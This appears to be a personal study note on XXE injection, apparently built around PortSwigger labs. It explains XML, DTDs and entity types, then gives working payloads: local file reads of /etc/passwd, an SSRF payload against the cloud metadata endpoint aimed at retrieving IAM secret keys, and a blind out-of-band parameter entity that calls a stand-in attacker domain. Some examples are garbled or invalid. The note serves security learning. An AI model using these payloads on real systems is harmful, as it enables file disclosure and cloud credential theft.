[[Bug]]
**XXE (XML External Entity) injection** is a type of security flaw that exploits vulnerabilities in an application's XML input. It occurs when an application accepts XML input that includes external entity references within the XML itself. Attackers can leverage this vulnerability to disclose local files, make server-side requests, or execute remote code.

### What is XML?

XML (Extensible Markup Language) is a markup language derived from SGML (Standard Generalized Markup Language), which is the same standard that HTML is based on. XML is typically used by applications to store and transport data in a format that's both human-readable and machine-parseable. It's a flexible and widely used format for exchanging data between different systems and applications. XML consists of elements, attributes, and character data, which are used to represent data in a structured and organized way.
### XML Syntax and Structure

XML elements are represented by tags, which are surrounded by angle brackets (<>). Tags usually come in pairs, with the opening tag preceding the content and the closing tag following the content. For example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<user id="1">
   <name>John</name>
   <age>30</age>
   <address>
      <street>123 Main St</street>
      <city>Anytown</city>
   </address>
</user>
```

### What are DTDs?

DTDs or Document Type Definitions define the structure and constraints of an XML document. They specify the allowed elements, attributes, and relationships between them. DTDs can be internal within the XML document or external in a separate file.

Purpose and usage of DTDs:

- **Validation**: DTDs validate the structure of XML to ensure it meets specific criteria before processing, which is crucial in environments where data integrity is key.
- **Entity Declaration**: DTDs define entities that can be used throughout the XML document, including external entities which are key in XXE attacks.  
    

Internal DTDs are specified using the `<!DOCTYPE` declaration, while external DTDs are referenced using the SYSTEM keyword.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE config [
<!ELEMENT config (database)>
<!ELEMENT database (username, password)>
<!ELEMENT username (#PCDATA)>
<!ELEMENT password (#PCDATA)>
]>
<config>
<!-- configuration data -->
</config>
```

### DTDs and XXE

DTDs play a crucial role in XXE injection, as they can be used to declare external entities. External entities can reference external files or URLs, which can lead to malicious data or code injection.

### XML Entities

XML entities are placeholders for data or code that can be expanded within an XML document. There are five types of entities: internal entities, external entities, parameter entities, general entities, and character entities.

Example external entity:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY external SYSTEM "http://example.com/test.dtd">
<config>
&external;
</config>
```

This shows an external entity referencing a URL. The `&external;` reference within the XML document will be expanded to the contents of the referenced URL.

### Types of Entities

1. Internal Entities are essentially variables used within an XML document to define and substitute content that may be repeated multiple times. They are defined in the DTD (Document Type Definition) and can simplify the management of repetitive information. For example:
    
    ```xml
    <!DOCTYPE note [
    <!ENTITY inf "This is a test.">
    ]>
    <note>
            <info>&inf;</info>
    </note>
    ```
    
    In this example, the `&inf;` entity is replaced by its value wherever it appears in the document.
    
2. External Entities are similar to internal entities, but their contents are referenced from outside the XML document, such as from a separate file or URL. This feature can be exploited in XXE (XML External Entity) attacks if the XML processor is configured to resolve external entities. For example:
    
    ```xml
    <!DOCTYPE note [
    <!ENTITY ext SYSTEM "http://example.com/external.dtd">
    ]>
    <note>
            <info>&ext;</info>
    </note>
    ```
    
    Here, `&ext;` pulls content from the specified URL, which could be a security risk if the URL is controlled by an attacker.
    
3. Parameter Entities are special types of entities used within DTDs to define reusable structures or to include external DTD subsets. They are particularly useful for modularizing DTDs and for maintaining large-scale XML applications. For example:
    
    ```xml
    <!DOCTYPE note [
    <!ENTITY % common "CDATA">
    <!ELEMENT name (%common;)>
    ]>
    <note>
            <name>John Doe</name>
    </note>
    ```
    
    In this case, `%common;` is used within the DTD to define the type of data that the `name` element should contain.
    
4. General Entities are similar to variables and can be declared either internally or externally. They are used to define substitutions that can be used within the body of the XML document. Unlike parameter entities, general entities are intended for use in the document content. For example:
    
    ```xml
    <!DOCTYPE note [
    <!ENTITY author "John Doe">
    ]>
    <note>
            <writer>&author;</writer>
    </note>
    ```
    
    The entity `&author;` is a general entity used to substitute the author's name wherever it's referenced in the document.
    
5. Character Entities are used to represent special or reserved characters that cannot be used directly in XML documents. These entities prevent the parser from misinterpreting XML syntax. For example:
    
    - `&lt;` for the less-than symbol (`<`)
    - `&gt;` for the greater-than symbol (`>`)
    - `&amp;` for the ampersand (`&`)
    
    ```xml
    <note>
            <text>Use &lt; to represent a less-than symbol.</text>
    </note>
    ```
    
    This usage ensures that the special characters are processed correctly by the XML parser without breaking the document's structure.
    

The image below shows the type of entities in a DOM structure:
![[XML ENTITY.png]]
### XML Parsing

XML parsing is the process by which an XML file is read, and its information is accessed and manipulated by a software program. XML parsers convert data from XML format into a structure that a program can use (like a DOM tree). During this process, parsers may validate XML data against a schema or a DTD, ensuring the structure conforms to certain rules.
### Common XML Parsers

Several XML parsers are used across different programming environments; each parser may handle XML data differently, which can affect vulnerability to XXE injection.

- **DOM (Document Object Model) Parser**: This method builds the entire XML document into a memory-based tfree structure, allowing random access to all parts of the document. It is resource-intensive but very flexible.
- **SAX (Simple API for XML) Parser**: Parses XML data sequentially without loading the whole document into memory, making it suitable for large XML files. However, it is less flexible for accessing XML data randomly.
- **StAX (Streaming API for XML) Parser**: Similar to SAX, StAX parses XML documents in a streaming fashion but gives the programmer more control over the XML parsing process.
- **XPath Parser**: Parses an XML document based on expression and is used extensively in conjunction with XSLT.

###  Exploiting XXE to retrieve files

how to do it :
- Introduce (or edit) a `DOCTYPE` element that defines an external entity containing the path to the file.
- Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.



what payload will look like:
```XXE
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId></stockCheck>
```


### Exploiting XXE to perform SSRF attacks


it use the same way of file but it will be like this :
```XXE
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "`http://169.254.169.254/`"> ]> <stockCheck><productId>&xxe;</productId></stockCheck>
```
and if it work it will show error , and you should add `latest` and do it everytime until it will be like this
`http://169.254.169.254/latest/meta-data/iam/security-credentials/admin`

then This should return JSON containing the `SecretAccessKey`.
### In-Band vs Out-of-Band XXE

In-band XXE refers to an XXE vulnerability where the attacker can see the response from the server. This allows for straightforward data exfiltration and exploitation. The attacker can simply send a malicious XML payload to the application, and the server will respond with the extracted data or the result of the attack.

Out-of-band XXE, on the other hand, refers to an XXE vulnerability where the attacker cannot see the response from the server. This requires using alternative channels, such as DNS or HTTP requests, to exfiltrate data. To extract the data, the attacker must craft a malicious XML payload that will trigger an out-of-band request, such as a DNS query or an HTTP request.

there's lab and it the same as the port swigger but there is new info :
there is two way to write xml code injection and it 
### *`in-band xxe`* :
#### `one`
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo[<!ENTITY xss SYSTEM "file:///etc/passwd">]>
<contact>

<name>&xss;</name><email>test@test.com</email><message>	&xss;
</message></contact>
```
####  `TWO`
```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<contact>
<name>&xxe;</name>
<email>test@test.com</email>
<message>test</message>
</contact>
```

**There are two broad ways in which you can find and exploit blind XXE vulnerabilities:**

- You can trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data.
- You can trigger XML parsing errors in such a way that the error messages contain sensitive data.

### Detecting blind XXE using out-of-band (OAST) techniques
Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:

`<!ENTITY % myparameterentity "my parameter entity value" >`

And second, parameter entities are referenced using the percent character instead of the usual ampersand:

`%myparameterentity;`

This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:

`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`

This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.

### Exploiting blind XXE to exfiltrate data out-of-band